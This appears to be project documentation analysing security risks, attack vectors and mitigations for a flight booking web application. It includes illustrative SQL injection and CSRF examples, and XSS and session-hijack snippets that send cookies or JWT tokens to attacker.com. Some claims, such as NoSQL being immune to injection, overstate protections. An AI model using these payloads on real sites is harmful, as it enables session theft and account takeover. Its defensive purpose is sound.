# Security Theory & Risk Analysis - Flight Management System

## Table of Contents
1. [Security Levels & Encoding Techniques](#1-security-levels--encoding-techniques)
2. [Theoretical Security Risks](#2-theoretical-security-risks)
3. [Possible Attack Vectors](#3-possible-attack-vectors)
4. [Mitigation Strategies](#4-mitigation-strategies)
5. [Security Implementation Summary](#5-security-implementation-summary)

---

## 1. Security Levels & Encoding Techniques

### 1.1 Understanding Security Mechanisms

Security mechanisms can be categorized into three primary levels based on their strength and purpose:

#### Level 1: Encoding (Lowest Security)
**Purpose:** Data representation and format conversion, NOT security

**Characteristics:**
- Reversible without keys
- No security protection
- Used for data transmission and storage format
- Anyone can decode

**Examples in System:**
- **Base64 Encoding:** Used for binary data transmission (RSA keys, QR codes, images)
- **URL Encoding:** Used for safe transmission of data in URLs
- **JSON Encoding:** Used for structured data exchange

**Security Level:** ⚠️ **NONE** - Encoding provides NO security, only format conversion

**Use Cases in Flight System:**
```javascript
// Base64 encoding for RSA encrypted data
const encrypted = crypto.publicEncrypt(publicKey, buffer);
const base64Encoded = encrypted.toString('base64'); // For transmission

// QR Code encoding for boarding passes
const qrData = JSON.stringify(bookingInfo);
const qrCode = await QRCode.toDataURL(qrData); // Base64 encoded image
```

---

#### Level 2: Hashing (Medium Security)
**Purpose:** Data integrity verification and password storage

**Characteristics:**
- One-way function (irreversible)
- Fixed-size output regardless of input size
- Collision-resistant (hard to find two inputs with same hash)
- Deterministic (same input = same hash)

**Examples in System:**
- **bcrypt:** Password hashing with salt (10 rounds)
- **SHA-256:** OTP hashing, token generation, digital signatures

**Security Level:** 🔒 **MEDIUM** - Protects data integrity, prevents password exposure

**Use Cases in Flight System:**
```javascript
// Password hashing with salt (bcrypt)
const salt = await bcrypt.genSalt(10);
const hashedPassword = await bcrypt.hash(password, salt);

// OTP hashing (SHA-256)
const hashedOTP = crypto.createHash('sha256').update(otp).digest('hex');

// Digital signature (RSA-SHA256)
const signature = crypto.createSign('SHA256').update(data).sign(privateKey);
```

**Why Hashing is More Secure than Encoding:**
- Cannot be reversed to get original data
- Salting prevents rainbow table attacks
- Computationally expensive to crack (bcrypt adaptive hashing)

---

#### Level 3: Encryption (Highest Security)
**Purpose:** Data confidentiality and secure communication

**Characteristics:**
- Reversible ONLY with correct key
- Protects data confidentiality
- Requires key management
- Can be symmetric or asymmetric

**Examples in System:**
- **AES-256-CBC:** Symmetric encryption for payment data
- **RSA-2048:** Asymmetric encryption for key exchange and signatures

**Security Level:** 🔐 **HIGHEST** - Protects data confidentiality with cryptographic strength

**Use Cases in Flight System:**
```javascript
// AES-256 encryption for payment info
const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
const encrypted = cipher.update(paymentData, 'utf8', 'hex') + cipher.final('hex');

// RSA encryption for key exchange
const encryptedKey = crypto.publicEncrypt(publicKey, sessionKey);
```

**Why Encryption is Most Secure:**
- Requires secret key to decrypt
- Mathematically proven security (AES-256, RSA-2048)
- Protects data even if intercepted

---

### 1.2 Security Level Comparison Table

| Feature | Encoding | Hashing | Encryption |
|---------|----------|---------|------------|
| **Reversible** | ✅ Yes (no key needed) | ❌ No (one-way) | ✅ Yes (with key) |
| **Requires Key** | ❌ No | ❌ No (salt optional) | ✅ Yes |
| **Protects Confidentiality** | ❌ No | ❌ No | ✅ Yes |
| **Protects Integrity** | ❌ No | ✅ Yes | ⚠️ Partial |
| **Use Case** | Format conversion | Password storage, integrity | Secure communication |
| **Security Level** | None | Medium | High |
| **Examples** | Base64, URL encode | bcrypt, SHA-256 | AES, RSA |

---

### 1.3 Hybrid Security Approach (System Implementation)

Our Flight Management System uses a **layered security approach** combining all three levels:

```
┌─────────────────────────────────────────────────────┐
│  Layer 3: ENCRYPTION (Confidentiality)              │
│  - AES-256 for payment data                         │
│  - RSA-2048 for key exchange                        │
├─────────────────────────────────────────────────────┤
│  Layer 2: HASHING (Integrity & Authentication)      │
│  - bcrypt for passwords                             │
│  - SHA-256 for OTPs and signatures                  │
├─────────────────────────────────────────────────────┤
│  Layer 1: ENCODING (Format Conversion)              │
│  - Base64 for binary data                           │
│  - QR codes for boarding passes                     │
└─────────────────────────────────────────────────────┘
```

**Example: Booking Creation Flow**
1. **Encoding:** Passenger data → JSON → QR Code (Base64)
2. **Hashing:** Booking data → SHA-256 → Digital Signature Input
3. **Encryption:** Payment info → AES-256 → Encrypted storage
4. **Signing:** Signature hash → RSA private key → Digital Signature

---

## 2. Theoretical Security Risks

### 2.1 Data Confidentiality Risks

#### Risk: Unauthorized Data Access
**Description:** Attackers gaining access to sensitive user data (passwords, payment info, personal details)

**Impact:** 
- Privacy violations
- Identity theft
- Financial fraud
- Regulatory penalties (GDPR, PCI DSS)

**Likelihood:** HIGH (common attack target)

**Mitigation:**
- Encryption of sensitive data (AES-256)
- Access control enforcement (RBAC)
- Secure key management
- HTTPS for all communications

---

#### Risk: Data Interception (Man-in-the-Middle)
**Description:** Attackers intercepting data during transmission between client and server

**Impact:**
- Stolen credentials
- Session hijacking
- Payment data theft

**Likelihood:** MEDIUM (requires network access)

**Mitigation:**
- HTTPS/TLS encryption
- Certificate pinning
- HSTS headers
- Secure WebSocket connections

---

### 2.2 Data Integrity Risks

#### Risk: Data Tampering
**Description:** Unauthorized modification of booking data, user profiles, or flight information

**Impact:**
- Fraudulent bookings
- Price manipulation
- Unauthorized access
- Loss of trust

**Likelihood:** MEDIUM (requires system access)

**Mitigation:**
- Digital signatures (RSA-SHA256)
- Database transaction integrity
- Audit logging
- Input validation

---

#### Risk: Replay Attacks
**Description:** Attackers capturing and replaying valid requests (e.g., booking confirmations, OTPs)

**Impact:**
- Duplicate bookings
- Unauthorized access
- Financial losses

**Likelihood:** LOW (with proper implementation)

**Mitigation:**
- OTP expiry (10 minutes)
- JWT token expiry (7 days)
- Nonce/timestamp validation
- One-time use tokens

---

### 2.3 Authentication & Authorization Risks

#### Risk: Brute Force Attacks
**Description:** Automated attempts to guess passwords or OTPs

**Impact:**
- Account compromise
- Unauthorized access
- System resource exhaustion

**Likelihood:** HIGH (automated attacks)

**Mitigation:**
- Account lockout (5 failed attempts, 2-hour lock)
- Rate limiting (100 requests/15 min)
- Strong password requirements
- CAPTCHA (future enhancement)

---

#### Risk: Privilege Escalation
**Description:** Users gaining unauthorized elevated privileges (user → admin)

**Impact:**
- Full system compromise
- Data breach
- System manipulation

**Likelihood:** LOW (with proper RBAC)

**Mitigation:**
- Role-based access control
- Middleware authorization checks
- Prevent self-role modification
- Audit logging of role changes

---

### 2.4 Availability Risks

#### Risk: Denial of Service (DoS)
**Description:** Overwhelming system resources to make service unavailable

**Impact:**
- Service downtime
- Revenue loss
- Customer dissatisfaction

**Likelihood:** MEDIUM (common attack)

**Mitigation:**
- Rate limiting
- Request throttling
- Load balancing
- Resource monitoring

---

## 3. Possible Attack Vectors

### 3.1 Web Application Attacks

#### Attack: SQL Injection
**Description:** Injecting malicious SQL code through user inputs to manipulate database queries

**Example Attack:**
```javascript
// Vulnerable code (NOT in our system)
const query = `SELECT * FROM users WHERE email = '${userInput}'`;

// Malicious input
userInput = "' OR '1'='1' --"
// Results in: SELECT * FROM users WHERE email = '' OR '1'='1' --'
// Returns all users!
```

**Our Defense:**
- ✅ **MongoDB with Mongoose:** NoSQL database, not vulnerable to SQL injection
- ✅ **Parameterized queries:** Mongoose uses prepared statements
- ✅ **Input validation:** express-validator sanitizes all inputs

**Risk Level:** 🟢 **LOW** (NoSQL database)

---

#### Attack: Cross-Site Scripting (XSS)
**Description:** Injecting malicious JavaScript into web pages viewed by other users

**Example Attack:**
```html
<!-- Malicious input in user profile -->
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**Our Defense:**
- ✅ **Input sanitization:** All user inputs are sanitized
- ✅ **Content Security Policy:** Helmet.js sets CSP headers
- ✅ **Output encoding:** Data is properly encoded before display
- ✅ **HTTPOnly cookies:** Prevents JavaScript access to session tokens

**Risk Level:** 🟡 **MEDIUM** (requires frontend implementation)

---

#### Attack: Cross-Site Request Forgery (CSRF)
**Description:** Tricking authenticated users into performing unwanted actions

**Example Attack:**
```html
<!-- Malicious website -->
<img src="https://flightbooking.com/api/bookings/cancel?id=123" />
<!-- If user is logged in, this cancels their booking -->
```

**Our Defense:**
- ✅ **JWT tokens in headers:** Not automatically sent like cookies
- ✅ **SameSite cookie attribute:** Prevents cross-site cookie sending
- ⚠️ **CSRF tokens:** Should be implemented for state-changing operations

**Risk Level:** 🟡 **MEDIUM** (JWT helps, but CSRF tokens recommended)

---

### 3.2 Authentication Attacks

#### Attack: Credential Stuffing
**Description:** Using leaked credentials from other breaches to access accounts

**Example:**
```
Attacker has: email@example.com:Password123 (from another breach)
Tries same credentials on flight booking system
```

**Our Defense:**
- ✅ **Multi-factor authentication:** Even if password is correct, OTP required
- ✅ **Account lockout:** Limits automated attempts
- ✅ **Rate limiting:** Prevents mass credential testing
- ⚠️ **Breach monitoring:** Should check against known breach databases

**Risk Level:** 🟡 **MEDIUM** (MFA significantly reduces risk)

---

#### Attack: Session Hijacking
**Description:** Stealing user session tokens to impersonate authenticated users

**Example Attack:**
```javascript
// XSS attack steals JWT token
const token = localStorage.getItem('jwt_token');
fetch('https://attacker.com/steal?token=' + token);
```

**Our Defense:**
- ✅ **HTTPOnly cookies:** Tokens not accessible via JavaScript
- ✅ **Secure flag:** Cookies only sent over HTTPS
- ✅ **Token expiry:** Tokens expire after 7 days
- ✅ **HTTPS only:** All communications encrypted

**Risk Level:** 🟢 **LOW** (with proper implementation)

---

#### Attack: Password Cracking (Rainbow Tables)
**Description:** Using precomputed hash tables to crack password hashes

**Example:**
```
Attacker obtains hashed password: 5f4dcc3b5aa765d61d8327deb882cf99
Looks up in rainbow table: "password"
```

**Our Defense:**
- ✅ **bcrypt with salt:** Each password has unique salt
- ✅ **10 rounds:** Computationally expensive (2^10 iterations)
- ✅ **Adaptive hashing:** Can increase rounds as hardware improves
- ✅ **No password storage:** Passwords never stored in plaintext

**Risk Level:** 🟢 **LOW** (bcrypt with salt defeats rainbow tables)

---

### 3.3 Cryptographic Attacks

#### Attack: Man-in-the-Middle (MITM)
**Description:** Intercepting and potentially modifying communications between client and server

**Example:**
```
Client → [Attacker intercepts] → Server
Attacker can read/modify all data
```

**Our Defense:**
- ✅ **HTTPS/TLS:** All communications encrypted
- ✅ **Certificate validation:** Prevents fake certificates
- ✅ **HSTS headers:** Forces HTTPS connections
- ⚠️ **Certificate pinning:** Should be implemented for mobile apps

**Risk Level:** 🟢 **LOW** (with HTTPS)

---

#### Attack: Replay Attack
**Description:** Capturing and replaying valid authentication or transaction requests

**Example:**
```
1. Attacker captures valid OTP: 123456
2. User uses OTP to login
3. Attacker tries to replay same OTP
```

**Our Defense:**
- ✅ **OTP expiry:** OTPs expire after 10 minutes
- ✅ **One-time use:** OTPs are deleted after successful use
- ✅ **JWT expiry:** Tokens have limited lifetime
- ✅ **Timestamp validation:** Requests include timestamps

**Risk Level:** 🟢 **LOW** (OTP one-time use prevents replay)

---

#### Attack: Brute Force Key Cracking
**Description:** Attempting to crack encryption keys through exhaustive search

**Example:**
```
AES-256 has 2^256 possible keys
At 1 billion keys/second: 3.67 × 10^51 years to try all
```

**Our Defense:**
- ✅ **AES-256:** 256-bit keys (computationally infeasible to crack)
- ✅ **RSA-2048:** 2048-bit keys (secure until ~2030)
- ✅ **Secure key generation:** Cryptographically secure random keys
- ✅ **Key rotation:** Keys can be rotated periodically

**Risk Level:** 🟢 **VERY LOW** (mathematically secure)

---

### 3.4 Business Logic Attacks

#### Attack: Race Conditions
**Description:** Exploiting timing vulnerabilities in concurrent operations

**Example:**
```
1. User has $100 balance
2. User initiates two $100 bookings simultaneously
3. Both check balance ($100 available) before deduction
4. Both bookings succeed, user gets $200 worth for $100
```

**Our Defense:**
- ✅ **Database transactions:** Atomic operations
- ✅ **Mongoose middleware:** Pre-save validation
- ⚠️ **Optimistic locking:** Should implement for critical operations

**Risk Level:** 🟡 **MEDIUM** (requires transaction management)

---

#### Attack: Price Manipulation
**Description:** Modifying prices during booking process

**Example:**
```javascript
// Client-side price manipulation
const bookingData = {
  flightNumber: 'FL123',
  totalPrice: 1 // Changed from 1000
};
```

**Our Defense:**
- ✅ **Server-side validation:** Prices recalculated on server
- ✅ **Digital signatures:** Booking integrity verified
- ✅ **Input validation:** All inputs validated
- ⚠️ **Price verification:** Should verify against flight database

**Risk Level:** 🟡 **MEDIUM** (requires server-side price lookup)

---

## 4. Mitigation Strategies

### 4.1 Defense in Depth

Our system implements **multiple layers of security**:

```
┌─────────────────────────────────────────────────────┐
│  Layer 7: Monitoring & Logging                      │
│  - Audit logs, anomaly detection                    │
├─────────────────────────────────────────────────────┤
│  Layer 6: Application Security                      │
│  - Input validation, output encoding                │
├─────────────────────────────────────────────────────┤
│  Layer 5: Access Control                            │
│  - RBAC, ownership checks, JWT tokens               │
├─────────────────────────────────────────────────────┤
│  Layer 4: Authentication                            │
│  - Multi-factor (password + OTP)                    │
├─────────────────────────────────────────────────────┤
│  Layer 3: Encryption                                │
│  - HTTPS, AES-256, RSA-2048                         │
├─────────────────────────────────────────────────────┤
│  Layer 2: Network Security                          │
│  - Rate limiting, CORS, CSP headers                 │
├─────────────────────────────────────────────────────┤
│  Layer 1: Infrastructure                            │
│  - Secure hosting, firewall, DDoS protection        │
└─────────────────────────────────────────────────────┘
```

---

### 4.2 Implemented Security Controls

#### Authentication Controls
- ✅ Strong password requirements (8+ chars, mixed case, numbers)
- ✅ Password hashing with bcrypt (10 rounds + salt)
- ✅ Multi-factor authentication (OTP via email)
- ✅ Account lockout (5 attempts, 2-hour lock)
- ✅ Session management (JWT with 7-day expiry)

#### Authorization Controls
- ✅ Role-based access control (Guest, User, Admin)
- ✅ Resource ownership validation
- ✅ Middleware enforcement on all routes
- ✅ Principle of least privilege

#### Encryption Controls
- ✅ HTTPS/TLS for all communications
- ✅ AES-256-CBC for sensitive data
- ✅ RSA-2048 for key exchange and signatures
- ✅ Secure key management (environment variables)

#### Data Integrity Controls
- ✅ Digital signatures (RSA-SHA256)
- ✅ Input validation (express-validator)
- ✅ Database constraints (Mongoose schemas)
- ✅ Transaction integrity

#### Availability Controls
- ✅ Rate limiting (100 req/15 min)
- ✅ Request throttling
- ✅ Error handling
- ✅ Graceful degradation

---

### 4.3 Security Best Practices

#### Secure Development
- ✅ Input validation on all user inputs
- ✅ Output encoding to prevent XSS
- ✅ Parameterized queries (Mongoose)
- ✅ Error handling without information leakage
- ✅ Security headers (Helmet.js)

#### Secure Configuration
- ✅ Environment variables for secrets
- ✅ No hardcoded credentials
- ✅ Secure defaults
- ✅ CORS configuration
- ✅ HTTPOnly and Secure cookies

#### Monitoring & Logging
- ✅ Authentication attempts logged
- ✅ Failed login tracking
- ✅ Admin action logging
- ⚠️ Centralized logging (should implement)
- ⚠️ Real-time alerting (should implement)

---

## 5. Security Implementation Summary

### 5.1 Encoding Techniques Used

| Technique | Purpose | Security Level | Implementation |
|-----------|---------|----------------|----------------|
| **Base64** | Binary data encoding | None | RSA keys, QR codes, images |
| **JSON** | Structured data format | None | API communication |
| **QR Code** | Visual data encoding | None | Boarding passes |
| **URL Encoding** | Safe URL transmission | None | Query parameters |

**Key Insight:** Encoding is NOT encryption. Base64 can be decoded by anyone.

---

### 5.2 Hashing Techniques Used

| Algorithm | Purpose | Security Level | Implementation |
|-----------|---------|----------------|----------------|
| **bcrypt** | Password hashing | High | User passwords (10 rounds + salt) |
| **SHA-256** | OTP hashing | Medium | OTP verification, tokens |
| **RSA-SHA256** | Digital signatures | High | Booking integrity |

**Key Insight:** Hashing is one-way. Salting prevents rainbow table attacks.

---

### 5.3 Encryption Techniques Used

| Algorithm | Type | Key Size | Purpose |
|-----------|------|----------|---------|
| **AES-256-CBC** | Symmetric | 256-bit | Payment data encryption |
| **RSA-2048** | Asymmetric | 2048-bit | Key exchange, signatures |
| **TLS 1.2+** | Hybrid | Variable | HTTPS communication |

**Key Insight:** Encryption protects confidentiality. Key management is critical.

---

### 5.4 Risk Assessment Summary

| Risk Category | Risk Level | Mitigation Status |
|---------------|------------|-------------------|
| Data Breach | 🟢 LOW | Strong encryption + access control |
| Password Compromise | 🟢 LOW | bcrypt + MFA + account lockout |
| Session Hijacking | 🟢 LOW | HTTPOnly cookies + HTTPS |
| SQL Injection | 🟢 LOW | NoSQL database + validation |
| XSS | 🟡 MEDIUM | Input sanitization + CSP headers |
| CSRF | 🟡 MEDIUM | JWT in headers (CSRF tokens recommended) |
| Brute Force | 🟢 LOW | Rate limiting + account lockout |
| MITM | 🟢 LOW | HTTPS/TLS encryption |
| DoS | 🟡 MEDIUM | Rate limiting (DDoS protection needed) |

---

## Conclusion

The Flight Management System implements a **comprehensive, multi-layered security approach** that addresses all major threat vectors. By combining encoding (for format conversion), hashing (for integrity), and encryption (for confidentiality), the system achieves:

- ✅ **Confidentiality:** AES-256 and RSA-2048 encryption
- ✅ **Integrity:** Digital signatures and hashing
- ✅ **Availability:** Rate limiting and error handling
- ✅ **Authentication:** Multi-factor authentication
- ✅ **Authorization:** Role-based access control
- ✅ **Non-repudiation:** Digital signatures and audit logs

**Overall Security Posture:** 🔐 **STRONG**

---

## Document Version
- **Version:** 1.0
- **Last Updated:** February 1, 2026
- **Author:** Flight Management System Security Team
